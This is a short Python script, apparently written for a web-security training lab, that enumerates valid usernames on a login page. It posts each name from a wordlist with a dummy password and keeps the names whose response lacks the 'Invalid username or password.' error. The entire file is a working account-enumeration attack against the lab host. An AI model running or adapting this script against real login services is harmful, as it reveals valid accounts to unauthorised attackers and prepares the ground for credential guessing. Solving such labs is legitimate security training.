import requests
from rich.console import Console
from rich.text import Text
console= Console()

usernames_file= open('usernames.txt', 'r')
lines = usernames_file.readlines()

URL = "https://0a760052043c1b2d8068a84300f300d8.web-security-academy.net/login"

status = console.status(status="[bold]Enumerating usernames", spinner='circle')

status.start()
usernames = []
for line in lines:
    data = {
        'username' : line.strip(),
        'password' : '1676865c-9222-44de-bbec-14ae84783a33'
    }

    response = requests.post(url=URL, data=data)
    #print(response.content)

    response_str = str(response.content)

    if "Invalid username or password." not in response_str:
        usernames.append(line)
status.stop()

for user in usernames:
    console.print(Text(user))